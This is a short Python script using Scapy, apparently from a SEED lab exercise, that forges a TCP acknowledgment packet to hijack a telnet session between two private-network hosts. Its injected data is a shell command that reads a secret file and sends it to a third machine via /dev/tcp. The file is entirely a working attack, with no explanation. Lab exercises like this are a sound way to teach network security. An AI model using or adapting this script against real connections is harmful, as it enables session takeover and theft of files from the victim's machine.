#!/usr/bin/python3
import sys
from scapy.all import *

snum = 2238364246
anum = 1727126928

print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="10.0.2.4", dst="10.0.2.5")
TCPLayer = TCP(sport=52882, dport=23, flags="A",
               seq=snum+10, ack=anum)
Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
pkt = IPLayer/TCPLayer/Data
#ls(pkt)
send(pkt, verbose=0)
